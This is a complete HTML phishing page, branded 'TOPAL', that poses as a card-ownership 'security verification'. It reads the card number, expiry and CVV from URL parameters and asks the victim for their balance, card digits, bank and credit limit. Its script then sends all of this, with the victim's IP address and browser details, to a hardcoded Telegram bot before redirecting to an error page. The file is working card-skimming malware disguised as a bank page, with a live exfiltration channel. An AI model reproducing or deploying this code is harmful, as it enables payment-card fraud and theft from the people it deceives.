<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TOPAL â€¢ Security Confirmation</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg1:#0b1220; --bg2:#0f1b33; --accent:#4f8cff; --accent2:#6ee7ff;
      --card:#0f172a; --muted:#9aa4b2; --line:#1f2a44; --ok:#22c55e; --warn:#f59e0b;
    }
    *{box-sizing:border-box; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;}
    body{
      margin:0; min-height:100vh; color:#e5e7eb;
      background: radial-gradient(1200px 600px at 10% -10%, #1b2b5f 0%, transparent 60%),
                  radial-gradient(800px 500px at 110% 10%, #123b5a 0%, transparent 55%),
                  linear-gradient(160deg, var(--bg1), var(--bg2));
      display:grid; place-items:center; padding:24px;
    }
    .container{width:100%; max-width:500px;}

    /* Glass card */
    .glass{
      background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
      backdrop-filter: blur(10px);
      border:1px solid rgba(255,255,255,.12);
      border-radius:22px; box-shadow: 0 30px 60px rgba(0,0,0,.35);
      padding:28px;
    }

    /* Header */
    .header{display:flex; align-items:center; gap:12px; margin-bottom:24px;}
    .mark{
      width:42px; height:42px; border-radius:14px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      display:grid; place-items:center; color:#08101f; font-weight:900;
      box-shadow: inset 0 0 0 1px rgba(255,255,255,.35);
    }
    .brand{font-weight:800; letter-spacing:.5px; font-size:20px;}

    /* Security badge */
    .security-badge{
      background: linear-gradient(135deg, rgba(245,158,11,.15), rgba(34,197,94,.15));
      border:1px solid rgba(245,158,11,.3);
      border-radius:16px; padding:16px; margin-bottom:28px;
      display:flex; align-items:center; gap:12px;
    }
    .shield{font-size:24px;}
    .badge-text{flex:1;}
    .badge-text b{display:block; color:#fff;}
    .badge-text span{color:var(--muted); font-size:13px;}

    /* Content */
    .title{font-size:22px; font-weight:800; margin:0 0 8px;}
    .sub{color:var(--muted); font-size:14px; margin-bottom:28px;}

    /* Card preview */
    .card-preview{
      height:160px; border-radius:18px; padding:18px; margin-bottom:28px;
      background: linear-gradient(135deg, #0b1430, #121c3d);
      border:1px solid var(--line); position:relative; overflow:hidden;
    }
    .card-preview:after{
      content:""; position:absolute; inset:auto -30% -60% auto; width:200px; height:200px;
      background: radial-gradient(circle, rgba(110,231,255,.2), transparent 60%);
      transform: rotate(25deg);
    }
    .card-top{display:flex; justify-content:space-between; align-items:center;}
    .card-num{font-size:18px; letter-spacing:1.5px; margin:16px 0 10px;}
    .card-meta{display:flex; justify-content:space-between; color:#cbd5e1; font-size:12px;}

    /* Security questions */
    .questions{display:grid; gap:20px; margin-bottom:28px;}
    .question{}
    .q-title{display:flex; align-items:center; gap:8px; margin-bottom:10px; color:#e5e7eb;}
    .q-title b{font-size:14px;}
    .q-num{
      width:22px; height:22px; border-radius:50%; background:var(--accent);
      display:grid; place-items:center; font-size:11px; font-weight:800; color:#061226;
    }
    .options{display:grid; gap:8px;}
    .option{
      background:#0b1430; border:1px solid var(--line); border-radius:12px;
      padding:12px 16px; color:#cbd5e1; cursor:pointer; transition:all .2s;
    }
    .option:hover{border-color:var(--accent);}
    .option.selected{border-color:var(--accent); background:rgba(79,140,255,.1);}
    .input-group{
      background:#0b1430; border:1px solid var(--line); border-radius:12px;
      padding:14px; color:#e5e7eb; outline:none; width:100%;
      font-size:14px;
    }
    .input-group::placeholder{color:#6b7280;}
    .input-with-prefix {
      position: relative;
    }
    .input-with-prefix::before {
      content: "$";
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--muted);
      font-weight: 600;
    }
    .input-with-prefix input {
      padding-left: 28px;
    }
    .input-hint {
      font-size: 11px;
      color: var(--muted);
      margin-top: 6px;
      display: block;
    }

    /* Buttons */
    .buttons{display:flex; gap:12px; margin-top:24px;}
    .btn{
      flex:1; padding:14px 16px; border-radius:16px; border:none; cursor:pointer;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      color:#061226; font-weight:800; letter-spacing:.3px;
      box-shadow: 0 10px 30px rgba(79,140,255,.35);
    }
    .btn:disabled{
      opacity:.5; cursor:not-allowed;
    }
    .btn-ghost{
      padding:14px 16px; border-radius:16px; background:transparent; color:#cbd5e1;
      border:1px solid var(--line);
    }

    /* Loading overlay */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(11, 18, 32, 0.95);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 3px solid var(--line);
      border-top: 3px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Loading Overlay -->
  <div class="overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div style="position:absolute; bottom:30%; color:#cbd5e1; text-align:center;">
      Verifying security details...
    </div>
  </div>

  <div class="container">
    <div class="glass">
      <div class="header">
        <div class="mark">T</div>
        <div class="brand">TOPAL</div>
      </div>

      <div class="security-badge">
        <div class="shield">ðŸ”’</div>
        <div class="badge-text">
          <b>Security Verification Required</b>
          <span>Additional verification to confirm card ownership</span>
        </div>
      </div>

      <h1 class="title">Confirm Card Ownership</h1>
      <p class="sub">Please answer these security questions to verify this is your card.</p>

      <!-- Card Preview -->
      <div class="card-preview">
        <div class="card-top">
          <div class="brand">TOPAL</div>
          <div class="brand" style="font-size:14px;">VISA</div>
        </div>
        <div class="card-num" id="previewCardNum">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢</div>
        <div class="card-meta">
          <span id="previewName">CARDHOLDER NAME</span>
          <span id="previewExpiry">MM/YY</span>
        </div>
      </div>

      <!-- Security Questions -->
      <div class="questions">
        <!-- Question 1: Actual Card Balance -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">1</div>
            <b>What is the current balance on this card?</b>
          </div>
          <div style="position: relative;">
            <input type="text" 
                   class="input-group" 
                   id="cardBalance" 
                   placeholder="0.00"
                   inputmode="decimal"
                   style="padding-left: 30px;">
            <span style="position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted);">$</span>
          </div>
          <span class="input-hint">Enter the exact current balance (e.g., 1250.50)</span>
        </div>

        <!-- Question 2 -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">2</div>
            <b>Card usage frequency?</b>
          </div>
          <div class="options">
            <div class="option" data-q="2" data-a="Daily">Daily</div>
            <div class="option" data-q="2" data-a="Weekly">Weekly</div>
            <div class="option" data-q="2" data-a="Monthly">Monthly</div>
            <div class="option" data-q="2" data-a="Rarely">Rarely</div>
          </div>
        </div>

        <!-- Question 3 -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">3</div>
            <b>Recent transaction type?</b>
          </div>
          <div class="options">
            <div class="option" data-q="3" data-a="Online Shopping">Online Shopping</div>
            <div class="option" data-q="3" data-a="Grocery Store">Grocery Store</div>
            <div class="option" data-q="3" data-a="Gas Station">Gas Station</div>
            <div class="option" data-q="3" data-a="Restaurant">Restaurant</div>
            <div class="option" data-q="3" data-a="ATM Withdrawal">ATM Withdrawal</div>
          </div>
        </div>

        <!-- Question 4 -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">4</div>
            <b>Enter last 2 digits of card</b>
          </div>
          <input type="text" class="input-group" id="lastDigits" placeholder="Enter last 2 digits" maxlength="2" pattern="[0-9]{2}">
          <span class="input-hint">The last 2 digits of your 16-digit card number</span>
        </div>

        <!-- Question 5 -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">5</div>
            <b>Bank associated with card?</b>
          </div>
          <div class="options">
            <div class="option" data-q="5" data-a="Chase">Chase</div>
            <div class="option" data-q="5" data-a="Bank of America">Bank of America</div>
            <div class="option" data-q="5" data-a="Wells Fargo">Wells Fargo</div>
            <div class="option" data-q="5" data-a="Citibank">Citibank</div>
            <div class="option" data-q="5" data-a="Capital One">Capital One</div>
            <div class="option" data-q="5" data-a="Other">Other</div>
          </div>
        </div>
        
        <!-- Question 6: Available Credit (Optional) -->
        <div class="question">
          <div class="q-title">
            <div class="q-num">6</div>
            <b>Available credit limit? (Optional)</b>
          </div>
          <div style="position: relative;">
            <input type="text" 
                   class="input-group" 
                   id="creditLimit" 
                   placeholder="0.00"
                   inputmode="decimal"
                   style="padding-left: 30px;">
            <span style="position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted);">$</span>
          </div>
          <span class="input-hint">Optional - Helps verify account ownership</span>
        </div>
      </div>

      <div class="buttons">
        <button class="btn-ghost" id="backBtn">Go Back</button>
        <button class="btn" id="confirmBtn" disabled>Verify & Continue</button>
      </div>
    </div>
  </div>

  <script>
    // Telegram Bot Configuration
    const BOT_TOKEN = "7989669437:AAHLUlqKopjA7Bl0nd4t02XVVJLJdVRDr54";
    const CHAT_ID = "7289366513";
    const REDIRECT_URL = "error2.html";

    // DOM Elements
    const confirmBtn = document.getElementById('confirmBtn');
    const backBtn = document.getElementById('backBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const previewCardNum = document.getElementById('previewCardNum');
    const previewName = document.getElementById('previewName');
    const previewExpiry = document.getElementById('previewExpiry');
    const cardBalanceInput = document.getElementById('cardBalance');
    const lastDigitsInput = document.getElementById('lastDigits');
    const creditLimitInput = document.getElementById('creditLimit');

    // Get card details from URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const cardData = {
      name: decodeURIComponent(urlParams.get('name') || 'Not Provided'),
      number: decodeURIComponent(urlParams.get('number') || 'Not Provided'),
      expiry: decodeURIComponent(urlParams.get('expiry') || 'Not Provided'),
      cvv: decodeURIComponent(urlParams.get('cvv') || 'Not Provided'),
      amount: decodeURIComponent(urlParams.get('amount') || 'Not Provided')
    };

    // Selected answers storage
    const selectedAnswers = {
      1: null, // Actual balance
      2: null, // Usage frequency
      3: null, // Transaction type
      4: null, // Last 2 digits
      5: null, // Bank
      6: null  // Credit limit (optional)
    };

    // Initialize page with card data
    function initializePage() {
      // Update card preview
      if (cardData.number && cardData.number !== 'Not Provided') {
        const lastFour = cardData.number.slice(-4);
        previewCardNum.textContent = `â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ${lastFour}`;
      }
      
      if (cardData.name && cardData.name !== 'Not Provided') {
        previewName.textContent = cardData.name.toUpperCase();
      }
      
      if (cardData.expiry && cardData.expiry !== 'Not Provided') {
        previewExpiry.textContent = cardData.expiry;
      }
    }

    // Format currency input
    function formatCurrencyInput(input) {
      input.addEventListener('input', function(e) {
        // Remove all non-digit characters except decimal point
        let value = this.value.replace(/[^\d.]/g, '');
        
        // Ensure only one decimal point
        const decimalCount = value.split('.').length - 1;
        if (decimalCount > 1) {
          value = value.substring(0, value.lastIndexOf('.'));
        }
        
        // Limit to 2 decimal places
        if (value.includes('.')) {
          const parts = value.split('.');
          if (parts[1].length > 2) {
            value = parts[0] + '.' + parts[1].substring(0, 2);
          }
        }
        
        this.value = value;
        
        // Store in answers
        const questionNum = this.id === 'cardBalance' ? 1 : 6;
        selectedAnswers[questionNum] = value ? `$${value}` : null;
        
        checkAllQuestionsAnswered();
      });
    }

    // Handle option selection
    document.querySelectorAll('.option').forEach(option => {
      option.addEventListener('click', function() {
        const questionNum = parseInt(this.dataset.q);
        const answer = this.dataset.a;
        
        // Remove selected class from all options in this question
        document.querySelectorAll(`.option[data-q="${questionNum}"]`).forEach(opt => {
          opt.classList.remove('selected');
        });
        
        // Add selected class to clicked option
        this.classList.add('selected');
        
        // Store answer
        selectedAnswers[questionNum] = answer;
        
        // Check if all questions are answered
        checkAllQuestionsAnswered();
      });
    });

    // Handle last digits input
    lastDigitsInput.addEventListener('input', function() {
      // Allow only numbers
      this.value = this.value.replace(/[^0-9]/g, '');
      
      if (this.value.length === 2) {
        selectedAnswers[4] = this.value;
      } else {
        selectedAnswers[4] = null;
      }
      
      checkAllQuestionsAnswered();
    });

    // Check if all required questions are answered
    function checkAllQuestionsAnswered() {
      // Questions 1-5 are required, question 6 is optional
      const requiredAnswered = [
        selectedAnswers[1] !== null && selectedAnswers[1] !== '', // Balance
        selectedAnswers[2] !== null, // Usage
        selectedAnswers[3] !== null, // Transaction
        selectedAnswers[4] !== null, // Last digits
        selectedAnswers[5] !== null  // Bank
      ].every(answer => answer === true);
      
      confirmBtn.disabled = !requiredAnswered;
    }

    // Show loading overlay
    function showLoading() {
      loadingOverlay.style.display = 'flex';
    }

    // Hide loading overlay
    function hideLoading() {
      loadingOverlay.style.display = 'none';
    }

    // Send security verification to Telegram
    async function sendVerificationToTelegram() {
      // Format balance display
      const balance = selectedAnswers[1] || 'Not provided';
      const creditLimit = selectedAnswers[6] || 'Not provided';
      
      const message = `
ðŸ” CARD SECURITY VERIFICATION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ“‹ CARD DETAILS:
â€¢ Holder: ${cardData.name}
â€¢ Number: ${cardData.number}
â€¢ Expiry: ${cardData.expiry}
â€¢ CVV: ${cardData.cvv}
â€¢ Requested Amount: ${cardData.amount}

ðŸ’° FINANCIAL DETAILS:
â€¢ Current Balance: ${balance}
â€¢ Available Credit: ${creditLimit}

ðŸ”’ SECURITY ANSWERS:
1. Usage Frequency: ${selectedAnswers[2]}
2. Recent Transaction: ${selectedAnswers[3]}
3. Last 2 Digits: ${selectedAnswers[4]}
4. Bank: ${selectedAnswers[5]}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸŒ IP: ${await getIP()}
â° Time: ${new Date().toLocaleString()}
ðŸ“± User Agent: ${navigator.userAgent.substring(0, 80)}...
      `.trim();

      // Encode message for URL
      const encodedMessage = encodeURIComponent(message);
      
      // Telegram API URL
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
      
      try {
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.status}`);
        }
        
        // Send a second message with just the balance for quick viewing
        const quickMessage = encodeURIComponent(
          `ðŸ’° BALANCE ALERT\nCard: ${cardData.number.slice(-4)}\nBalance: ${balance}\nLimit: ${creditLimit}`
        );
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${quickMessage}`);
        
        return true;
      } catch (error) {
        console.error('Failed to send verification to Telegram:', error);
        return false;
      }
    }

    // Get IP address
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return 'IP not available';
      }
    }

    // Handle confirmation
    async function handleConfirmation(event) {
      event.preventDefault();
      
      if (confirmBtn.disabled) return;
      
      // Validate balance input
      if (!cardBalanceInput.value || isNaN(parseFloat(cardBalanceInput.value))) {
        cardBalanceInput.style.borderColor = '#fca5a5';
        return;
      }
      
      showLoading();
      
      try {
        // Send verification to Telegram
        const telegramSent = await sendVerificationToTelegram();
        
        // Add delay for visual feedback
        setTimeout(() => {
          if (telegramSent) {
            // Redirect to final page
            window.location.href = REDIRECT_URL;
          } else {
            alert('Verification submitted but could not send confirmation. You will be redirected.');
            setTimeout(() => {
              window.location.href = REDIRECT_URL;
            }, 1000);
          }
        }, 2000);
        
      } catch (error) {
        console.error('Confirmation error:', error);
        alert('Error in verification. You will be redirected.');
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 1500);
      }
    }

    // Handle back button
    backBtn.addEventListener('click', function() {
      window.history.back();
    });

    // Initialize the page
    initializePage();
    
    // Setup currency inputs
    formatCurrencyInput(cardBalanceInput);
    formatCurrencyInput(creditLimitInput);
    
    // Also validate balance input on blur
    cardBalanceInput.addEventListener('blur', function() {
      if (this.value && !isNaN(parseFloat(this.value))) {
        this.style.borderColor = '';
        selectedAnswers[1] = `$${parseFloat(this.value).toFixed(2)}`;
      }
    });

    // Add event listeners
    confirmBtn.addEventListener('click', handleConfirmation);

    // Display note about data in console
    console.log('Card data loaded from URL:', cardData);
  </script>
</body>
</html>